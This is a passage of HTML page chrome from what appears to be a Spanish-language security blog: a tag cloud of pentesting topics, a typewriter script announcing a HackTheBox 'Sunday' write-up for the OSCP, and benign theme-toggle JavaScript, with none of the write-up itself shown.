class="set-1">Mssqlclient,</a> <a href="/tag/multiples/" class="set-1">Multiples</a> <a href="/tag/myssql-server%2C/" class="set-1">Myssql-Server,</a> <a href="/tag/neo4j%2C/" class="set-1">Neo4j,</a> <a href="/tag/nibbleblog%2C/" class="set-1">NibbleBlog,</a> <a href="/tag/nishang%2C/" class="set-1">Nishang,</a> <a href="/tag/nosqli%2C/" class="set-1">NoSQLI,</a> <a href="/tag/node-red%2C/" class="set-1">Node-Red,</a> <a href="/tag/nostromo/" class="set-1">Nostromo</a> <a href="/tag/os/" class="set-1">OS</a> <a href="/tag/oscp/" class="set-3">OSCP</a> <a href="/tag/osticket%2C/" class="set-1">OSTicket,</a> <a href="/tag/offensive/" class="set-1">Offensive</a> <a href="/tag/olevba/" class="set-1">Olevba</a> <a href="/tag/php%2C/" class="set-1">PHP,</a> <a href="/tag/php./" class="set-1">PHP.</a> <a href="/tag/password/" class="set-1">Password</a> <a href="/tag/path/" class="set-1">Path</a> <a href="/tag/path%2C/" class="set-3">Path,</a> <a href="/tag/pivoting%2C/" class="set-1">Pivoting,</a> <a href="/tag/plugins%2C/" class="set-1">Plugins,</a> <a href="/tag/pods%2Fcontainer./" class="set-1">Pods/Container.</a> <a href="/tag/popd%2C/" class="set-1">PopD,</a> <a href="/tag/port/" class="set-1">Port</a> <a href="/tag/portknocking%2C/" class="set-1">PortKnocking,</a> <a href="/tag/portainer%2C/" class="set-1">Portainer,</a> <a href="/tag/portal%2C/" class="set-1">Portal,</a> <a href="/tag/post-explotacion./" class="set-1">Post-Explotacion.</a> <a href="/tag/powershell/" class="set-1">PowerShell</a> <a href="/tag/powerup%2C/" class="set-1">PowerUp,</a> <a href="/tag/powershell%2C/" class="set-1">Powershell,</a> <a href="/tag/privesc/" class="set-1">Privesc</a> <a href="/tag/privesc%2C/" class="set-1">Privesc,</a> <a href="/tag/proteccions%2C/" class="set-1">Proteccions,</a> <a href="/tag/protection%2C/" class="set-1">Protection,</a> <a href="/tag/python%2C/" class="set-1">Python,</a> <a href="/tag/python3%2C/" class="set-1">Python3,</a> <a href="/tag/rce%2C/" class="set-1">RCE,</a> <a href="/tag/rdp-file%2C/" class="set-1">RDP-file,</a> <a href="/tag/rpcclient%2C/" class="set-1">RPCCLIENT,</a> <a href="/tag/read%2C/" class="set-1">Read,</a> <a href="/tag/readgmsapassword%2C/" class="set-1">ReadGMSAPassword,</a> <a href="/tag/recycle/" class="set-1">Recycle</a> <a href="/tag/remote/" class="set-1">Remote</a> <a href="/tag/retiradas/" class="set-1">Retiradas</a> <a href="/tag/retiradas%2C/" class="set-5">Retiradas,</a> <a href="/tag/retiradas./" class="set-1">Retiradas.</a> <a href="/tag/revome/" class="set-1">Revome</a> <a href="/tag/smb%2C/" class="set-1">SMB,</a> <a href="/tag/snmp%2C/" class="set-1">SNMP,</a> <a href="/tag/sqli/" class="set-1">SQLI</a> <a href="/tag/sqli%2C/" class="set-1">SQLI,</a> <a href="/tag/sqlinjecction%2C/" class="set-1">SQLInjecction,</a> <a href="/tag/ss%2C/" class="set-1">SS,</a> <a href="/tag/ssh%2C/" class="set-1">SSH,</a> <a href="/tag/ssrf/" class="set-1">SSRF</a> <a href="/tag/ssrf%2C/" class="set-1">SSRF,</a> <a href="/tag/ssti%28server/" class="set-1">SSTI(Server</a> <a href="/tag/suid%2C/" class="set-1">SUID,</a> <a href="/tag/sam%2C/" class="set-1">Sam,</a> <a href="/tag/samba%2C/" class="set-1">Samba,</a> <a href="/tag/scheduler%2C/" class="set-1">Scheduler,</a> <a href="/tag/script%2C/" class="set-1">Script,</a> <a href="/tag/secretsdump.py%2C/" class="set-1">SecretsDump.py,</a> <a href="/tag/secretsdumps.py%2C/" class="set-1">Secretsdumps.py,</a> <a href="/tag/security%2C/" class="set-1">Security,</a> <a href="/tag/shares/" class="set-1">Shares</a> <a href="/tag/sharphound.ps1%2C/" class="set-1">SharpHound.ps1,</a> <a href="/tag/shellshock%2C/" class="set-1">ShellShock,</a> <a href="/tag/side/" class="set-1">Side</a> <a href="/tag/smart/" class="set-1">Smart</a> <a href="/tag/smb%2C/" class="set-1">Smb,</a> <a href="/tag/smbclient%2C/" class="set-1">SmbClient,</a> <a href="/tag/smbmap%2C/" class="set-1">SmbMap,</a> <a href="/tag/sqsh%2C/" class="set-1">Sqsh,</a> <a href="/tag/starting/" class="set-1">Starting</a> <a href="/tag/steganografia%2C/" class="set-1">Steganografia,</a> <a href="/tag/subdomains%2C/" class="set-1">Subdomains,</a> <a href="/tag/sudo/" class="set-1">Sudo</a> <a href="/tag/system%2C/" class="set-1">System,</a> <a href="/tag/thm%2C/" class="set-1">THM,</a> <a href="/tag/template/" class="set-1">Template</a> <a href="/tag/tmux-priv%2C/" class="set-1">Tmux-Priv,</a> <a href="/tag/tomcat/" class="set-1">Tomcat</a> <a href="/tag/tomcat%2C/" class="set-1">Tomcat,</a> <a href="/tag/transfer%2C/" class="set-1">Transfer,</a> <a href="/tag/transferencia/" class="set-1">Transferencia</a> <a href="/tag/tryhackme%2C/" class="set-1">TryHackMe,</a> <a href="/tag/ubuntu/" class="set-1">Ubuntu</a> <a href="/tag/unrealirc%2C/" class="set-1">UnRealIRC,</a> <a href="/tag/upload/" class="set-1">Upload</a> <a href="/tag/userenum%2C/" class="set-1">Userenum,</a> <a href="/tag/vnc/" class="set-1">VNC</a> <a href="/tag/web/" class="set-2">Web</a> <a href="/tag/web3%2C/" class="set-1">Web3,</a> <a href="/tag/webshell%2C/" class="set-1">Webshell,</a> <a href="/tag/wget/" class="set-1">Wget</a> <a href="/tag/winpeas%2C/" class="set-1">WinPeas,</a> <a href="/tag/windows/" class="set-1">Windows</a> <a href="/tag/windows%2C/" class="set-1">Windows,</a> <a href="/tag/wordpress%2C/" class="set-1">Wordpress,</a> <a href="/tag/wpscan%2C/" class="set-1">Wpscan,</a> <a href="/tag/writeup/" class="set-2">Writeup</a> <a href="/tag/writeup%2C/" class="set-3">Writeup,</a> <a href="/tag/x-forwarder-for%2C/" class="set-1">X-Forwarder-For,</a> <a href="/tag/xp_cmdshell%2C/" class="set-1">Xp_CmdShell,</a> <a href="/tag/xp_dirtree%2C/" class="set-1">Xp_dirtree,</a> <a href="/tag/ysoserial%2C/" class="set-1">Ysoserial,</a> <a href="/tag/zona%2C/" class="set-1">Zona,</a> <a href="/tag/zone/" class="set-1">Zone</a> <a href="/tag/app-js%2C/" class="set-1">app-js,</a> <a href="/tag/bashscript%2C/" class="set-1">bashscript,</a> <a href="/tag/chisel%2C/" class="set-1">chisel,</a> <a href="/tag/de/" class="set-1">de</a> <a href="/tag/dompdf%2C/" class="set-1">dompdf,</a> <a href="/tag/ecppt%2C/" class="set-1">eCPPT,</a> <a href="/tag/fcrackzip%2C/" class="set-1">fcrackzip,</a> <a href="/tag/html/" class="set-1">html</a> <a href="/tag/injecction/" class="set-1">injecction</a> <a href="/tag/msfvenom%2C/" class="set-1">msfvenom,</a> <a href="/tag/nmap%2C/" class="set-1">nmap,</a> <a href="/tag/pfsense%2C/" class="set-1">pfSense,</a> <a href="/tag/pfx2john%2C/" class="set-1">pfx2john,</a> <a href="/tag/phpliteadmin%2C/" class="set-1">phpLiteAdmin,</a> <a href="/tag/privesc/" class="set-1">privesc</a> <a href="/tag/privesc%2C/" class="set-1">privesc,</a> <a href="/tag/python%2C/" class="set-1">python,</a> <a href="/tag/redis-cli%2C/" class="set-1">redis-cli,</a> <a href="/tag/rsync%2C/" class="set-1">rsync,</a> <a href="/tag/smtpd%2C/" class="set-1">smtpd,</a> <a href="/tag/socat%2C/" class="set-1">socat,</a> <a href="/tag/squidproxy%2C/" class="set-1">squidproxy,</a> <a href="/tag/steghide%2C/" class="set-1">steghide,</a> <a href="/tag/tar%2C/" class="set-1">tar,</a> <a href="/tag/webdav%2C/" class="set-1">webdav,</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/xss/" class="set-1">xss</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'Writeup de la maquina de HackTheBox llamada Sunday siguiendo el PATH para el OSCP';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
